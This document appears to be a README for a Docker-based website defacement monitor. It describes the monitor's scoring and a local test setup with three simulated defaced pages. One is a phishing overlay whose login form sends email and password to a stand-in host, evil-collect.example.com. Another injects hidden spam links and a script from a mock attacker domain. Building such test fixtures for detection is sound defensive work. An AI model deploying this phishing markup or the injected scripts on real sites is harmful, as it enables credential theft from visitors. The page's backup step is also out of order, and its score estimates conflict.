# How the Script Works & Local Test Setup

## How the Script Works

### Overview

The monitor runs as a Docker container with an infinite loop. Every N seconds it opens a headless Chromium browser, visits every URL in `domains.txt`, compares the current state against a saved baseline, scores the difference, and sends an email if the score is high enough.

```
┌─────────────────────────────────────────────────────┐
│                   Docker Container                  │
│                                                     │
│  while True:                                        │
│      read domains.txt                               │
│      for each URL:                                  │
│          open headless Chrome                       │
│          visit page                                 │
│          extract signals                            │
│          compare to baseline                        │
│          score difference                           │
│          if score >= 60% → send email               │
│      sleep 300s                                     │
└─────────────────────────────────────────────────────┘
```

---

### Step 1 — First scan (baseline creation)

When a URL is seen for the first time, the monitor takes a "snapshot" of how the site looks right now. This becomes the reference point for all future comparisons.

The baseline is only saved if:
- The page returned HTTP 200
- No browser error occurred

If the page is down or returns an error — baseline is skipped and retried next cycle.

What gets saved in the baseline:
- Full-page screenshot (PNG)
- pHash of the screenshot (perceptual image fingerprint)
- SHA-256 of the normalized DOM structure
- Page title and brand prefix
- Dominant colors extracted from screenshot
- Dominant text script (Latin, Armenian, Cyrillic, Arabic...)
- Which identity elements exist: `<header>`, `<nav>`, `<footer>`, logo
- Number of forms and iframes
- External resource domains loaded
- `<script src="">` external domains
- Nav link domains
- Form action domains
- iframe src domains
- `<link rel="canonical">` URL
- `<meta name="robots">` content
- `<meta name="description">` content

---

### Step 2 — Subsequent scans (comparison)

On every scan after the baseline exists, the monitor:

1. Visits the page again with a fresh browser
2. Extracts all the same signals as above
3. Compares each signal against the baseline
4. Adds up a score (0–100%)
5. Creates a side-by-side comparison screenshot
6. Saves evidence JSON
7. Sends email if score ≥ `ALERT_THRESHOLD` (default 60%)

If the scan fails (network error, timeout), it retries up to `MAX_SCAN_RETRIES` times with `RETRY_DELAY_SECONDS` between attempts. If all retries fail — comparison image is still created but **no email is sent** (prevents false alerts for temporary downtime).

---

### Step 3 — Scoring

Each detected change adds points. The total is capped at 100%.

**Verdicts:**
| Score | Verdict |
|---|---|
| 90–100% | VERY_LIKELY_DEFACED |
| 70–89% | LIKELY_DEFACED |
| 40–69% | SUSPICIOUS |
| 0–39% | LIKELY_NORMAL |

**Key scoring rules:**
- Visual changes are weighted by site type — a news site is expected to look different every hour, a government portal is not
- Trusted domains (Google Analytics, live chat widgets, CDNs) never add points even if they're new
- Own subdomains never add points (e.g. `sub.example.am` on `example.am`)
- `www` vs non-`www` canonical difference is ignored
- Single new script domain alone doesn't trigger `SCRIPT_DOM_CORRELATION` — requires 2+
- Empty iframe src values are ignored

---

### Output files produced each cycle

```
website_data/
├── scan_results.json          ← all sites, full results
├── suspicious.json            ← sites scoring ≥ 40%
├── likely_defaced.json        ← sites scoring ≥ 70%
├── baselines/                 ← one JSON per site (first scan)
├── baseline_screenshots/      ← one PNG per site (first scan)
├── screenshots/               ← latest scan PNG per site
├── comparisons/               ← side-by-side PNG per site
└── evidence/                  ← full snapshot + analysis JSON per site
```

---

## Setting Up a Local Test Website

The monitor uses `http://host.docker.internal:8000/` to reach a web server running on your host machine from inside the Docker container. `host.docker.internal` is a special Docker DNS name that resolves to your host.

### What you need

- Python 3 (already installed on most Linux/Mac systems)
- A folder with HTML files
- The monitor running in Docker

---

### Step 1 — Create your test website folder

```bash
mkdir -p ~/Desktop/test-website
cd ~/Desktop/test-website
```

---

### Step 2 — Create the legitimate index.html

This is what the monitor will baseline. It needs real identity elements (`<header>`, `<nav>`, `<footer>`, logo) so the monitor has signals to detect when they disappear.

```bash
cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ArmenTech Solutions - Enterprise Software</title>
    <meta name="description" content="Enterprise software for Armenia">
    <link rel="canonical" href="http://host.docker.internal:8000/">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: Arial, sans-serif; background:#fff; color:#222; }
        header { background:#1a237e; padding:0 40px; height:70px; display:flex; align-items:center; justify-content:space-between; }
        .logo { color:#fff; font-size:22px; font-weight:700; }
        .logo span { color:#90caf9; }
        nav a { color:#cfd8dc; text-decoration:none; margin-left:24px; font-size:15px; }
        .hero { background:linear-gradient(135deg,#1a237e,#1565c0); color:#fff; padding:80px 40px; text-align:center; }
        .hero h1 { font-size:46px; margin-bottom:16px; }
        .hero p { font-size:18px; color:#bbdefb; max-width:560px; margin:0 auto; }
        .services { padding:70px 40px; background:#f5f7fa; text-align:center; }
        .services h2 { font-size:32px; color:#1a237e; margin-bottom:40px; }
        .cards { display:flex; justify-content:center; gap:24px; flex-wrap:wrap; }
        .card { background:#fff; border-radius:8px; padding:32px 24px; width:240px; box-shadow:0 2px 10px rgba(0,0,0,0.08); }
        .card h3 { color:#1a237e; margin-bottom:10px; }
        .card p { font-size:14px; color:#666; line-height:1.6; }
        footer { background:#0d1333; color:#546e7a; text-align:center; padding:24px 40px; font-size:13px; }
    </style>
</head>
<body>
<header>
    <div class="logo" id="logo">🛡️ <span>Armen</span>Tech</div>
    <nav>
        <a href="#">Home</a>
        <a href="#">Services</a>
        <a href="#">About</a>
        <a href="#">Contact</a>
    </nav>
</header>
<main>
    <section class="hero">
        <h1>Enterprise Software Solutions</h1>
        <p>Delivering secure, scalable technology to businesses across Armenia.</p>
    </section>
    <section class="services">
        <h2>Our Services</h2>
        <div class="cards">
            <div class="card"><h3>☁️ Cloud</h3><p>Scalable cloud infrastructure and disaster recovery.</p></div>
            <div class="card"><h3>🔒 Security</h3><p>Penetration testing and compliance audits.</p></div>
            <div class="card"><h3>⚙️ DevOps</h3><p>CI/CD pipelines and container orchestration.</p></div>
        </div>
    </section>
</main>
<footer>© 2026 ArmenTech Solutions. All rights reserved.</footer>
</body>
</html>
EOF
```

---

### Step 3 — Create defaced versions

**Variant 1 — Full hacktivist takeover** (triggers: title, visual, identity loss, language)
```bash
cat > defaced_1_hacktivist.html << 'EOF'
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<title>H4CK3D BY AnonGhost</title>
<style>
*{margin:0;padding:0;} body{background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;}
h1{font-size:80px;color:#f00;text-shadow:0 0 20px #f00;margin:20px 0;letter-spacing:6px;}
p{font-size:16px;color:#aaffaa;max-width:600px;line-height:2;border:1px solid #0f0;padding:20px;margin:16px;}
</style></head>
<body>
<div style="font-size:100px">💀</div>
<h1>H4CK3D</h1>
<p>BY ANONGHOST TEAM<br>Your security is a joke.<br>We were here.</p>
</body></html>
EOF
```

**Variant 2 — Phishing overlay** (triggers: large overlay, new form, form exfiltration, identity loss)
```bash
cat > defaced_2_phishing.html << 'EOF'
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<title>ArmenTech Solutions - Session Expired</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:Arial,sans-serif;background:#f0f2f5;}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,30,0.97);z-index:9999;display:flex;align-items:center;justify-content:center;}
.modal{background:#fff;border-radius:10px;padding:48px 40px;width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);}
.brand{font-size:20px;font-weight:700;color:#1a237e;margin-bottom:6px;}
.warn{color:#e53935;font-size:13px;font-weight:600;margin-bottom:24px;}
h2{font-size:20px;margin-bottom:16px;}
input{width:100%;padding:11px;border:1.5px solid #ddd;border-radius:5px;font-size:14px;margin-bottom:12px;}
button{width:100%;background:#1a237e;color:#fff;border:none;padding:13px;border-radius:5px;font-size:15px;font-weight:600;cursor:pointer;}
</style></head>
<body>
<div class="overlay">
  <div class="modal">
    <div class="brand">🛡️ ArmenTech</div>
    <div class="warn">⚠ Security Alert: Session Expired</div>
    <h2>Verify Your Identity</h2>
    <form action="https://evil-collect.example.com/steal" method="POST">
      <input type="email" name="email" placeholder="Email Address">
      <input type="password" name="password" placeholder="Password">
      <button type="submit">Verify & Continue</button>
    </form>
  </div>
</div>
<header style="visibility:hidden"><div id="logo">ArmenTech</div><nav><a href="#">Home</a></nav></header>
<footer style="visibility:hidden">© 2026 ArmenTech</footer>
</body></html>
EOF
```

**Variant 3 — Subtle SEO spam** (triggers: title change, DOM change, new external domains, hidden links)
```bash
cat > defaced_3_seo_spam.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ArmenTech Solutions - Enterprise Software | Best Casino Online 2026</title>
    <meta name="description" content="Enterprise software for Armenia">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;} body{font-family:Arial,sans-serif;background:#fff;color:#222;}
        header{background:#1a237e;padding:0 40px;height:70px;display:flex;align-items:center;justify-content:space-between;}
        .logo{color:#fff;font-size:22px;font-weight:700;} .logo span{color:#90caf9;}
        nav a{color:#cfd8dc;text-decoration:none;margin-left:24px;}
        .hero{background:linear-gradient(135deg,#1a237e,#1565c0);color:#fff;padding:80px 40px;text-align:center;}
        .hero h1{font-size:46px;margin-bottom:16px;}
        footer{background:#0d1333;color:#546e7a;text-align:center;padding:24px 40px;font-size:13px;}
        .spam{position:absolute;left:-9999px;top:-9999px;font-size:1px;color:transparent;}
    </style>
</head>
<body>
<!-- Hidden spam links injected -->
<div class="spam">
    <a href="https://casino-spam.ru/slots">best casino 2026</a>
    <a href="https://pharma-cheap.cn/viagra">cheap medicine</a>
    <a href="https://crypto-scam.io/pump">crypto signals</a>
</div>
<header>
    <div class="logo" id="logo">🛡️ <span>Armen</span>Tech</div>
    <nav><a href="#">Home</a><a href="#">Services</a><a href="#">About</a><a href="#">Contact</a></nav>
</header>
<main>
    <section class="hero">
        <h1>Enterprise Software Solutions</h1>
        <p>Delivering secure, scalable technology to businesses across Armenia.</p>
    </section>
</main>
<footer>© 2026 ArmenTech Solutions.</footer>
<!-- Injected external script from attacker C2 -->
<script src="https://evil-tracking.ru/track.js" async></script>
</body></html>
EOF
```

---

### Step 4 — Start the web server

```bash
cd ~/Desktop/test-website
python3 -m http.server 8000
```

The server runs on port 8000. Keep this terminal open while testing.

---

### Step 5 — Add to domains.txt

```bash
echo "http://host.docker.internal:8000/" >> ~/Desktop/website-deface/domains.txt
```

---

### Step 6 — Reset any old baseline

```bash
rm -f ~/Desktop/website-deface/website_data/baselines/host.docker.internal_8000*.json
rm -f ~/Desktop/website-deface/website_data/baseline_screenshots/host.docker.internal_8000*.png
```

---

### Step 7 — Restart Docker to pick up fresh baseline

```bash
cd ~/Desktop/website-deface
docker compose down
rm -rf website_data/
docker compose up -d
docker compose logs -f
```

---

### Step 8 — Wait for baseline cycle

Watch the logs until you see:

```
[BASELINE] http://host.docker.internal:8000/  (type: static)
Next scan in 300s
```

The legitimate `index.html` is now baselined.

---

### Step 9 — Swap in a defaced version and watch detection

```bash
# Test variant 1 — full takeover (expect ~80-100%)
cp ~/Desktop/test-website/defaced_1_hacktivist.html \
   ~/Desktop/test-website/index.html
```

Wait for the next scan cycle. You should see:

```
[RESULT] http://host.docker.internal:8000/ | static | 95% | VERY_LIKELY_DEFACED
[EMAIL] Sent successfully.
```

```bash
# Restore and test variant 2 — phishing overlay (expect ~70-90%)
cp ~/Desktop/test-website/index.html.bak ~/Desktop/test-website/index.html
# then:
cp ~/Desktop/test-website/defaced_2_phishing.html \
   ~/Desktop/test-website/index.html
```

```bash
# Test variant 3 — subtle SEO spam (expect ~30-50%, no email)
cp ~/Desktop/test-website/defaced_3_seo_spam.html \
   ~/Desktop/test-website/index.html
```

---

### Step 10 — Restore the original

```bash
# Keep a backup of the original
cp ~/Desktop/test-website/index.html ~/Desktop/test-website/index.html.bak

# Restore after testing
cp ~/Desktop/test-website/index.html.bak ~/Desktop/test-website/index.html
```

---

### Adjusting scan interval for faster testing

For testing you don't want to wait 5 minutes per cycle. Set a shorter interval in `.env`:

```env
SCAN_INTERVAL_SECONDS=30
```

Then restart:

```bash
docker compose down && docker compose up -d
```

Now scans run every 30 seconds — much faster for testing.

---

### Checking results without waiting for email

```bash
# See latest scores for all sites
cat ~/Desktop/website-deface/website_data/scan_results.json | python3 -m json.tool | grep -E "url|confidence|verdict"

# See only suspicious/defaced
cat ~/Desktop/website-deface/website_data/likely_defaced.json | python3 -m json.tool

# See comparison image
xdg-open ~/Desktop/website-deface/website_data/comparisons/host.docker.internal_8000_comparison.png
```

---

### Expected scores per variant

| Variant | Expected score | Signals fired |
|---|---|---|
| `defaced_1_hacktivist.html` | 80–100% | Title change, major visual change, identity loss (header/nav/footer/logo), language change if using non-Latin |
| `defaced_2_phishing.html` | 70–90% | Large overlay, new form, form exfiltration, identity loss |
| `defaced_3_seo_spam.html` | 20–40% | Title change, DOM change, new external script domain |

---

### Troubleshooting

**"Directory listing" instead of your page**

Python's HTTP server serves `index.html` automatically only if it exists in the current directory. Make sure you ran `python3 -m http.server 8000` from inside `~/Desktop/test-website/`, not from your home folder.

**Baseline not created**

Check the logs for `[BASELINE SKIPPED]`. This means the page returned a non-200 status or timed out. Verify the server is running: `curl http://localhost:8000`

**host.docker.internal not resolving**

On Linux, Docker may not automatically add this hostname. Check your `docker-compose.yml` has:

```yaml
extra_hosts:
  - "host.docker.internal:host-gateway"
```

You already have this in your config — so this should not be an issue.

**Score lower than expected**

The baseline may have been created from a broken state (directory listing, error page). Delete the baseline and re-run with the clean `index.html` serving correctly.

```bash
rm ~/Desktop/website-deface/website_data/baselines/host.docker.internal_8000*.json
rm ~/Desktop/website-deface/website_data/baseline_screenshots/host.docker.internal_8000*.png
```
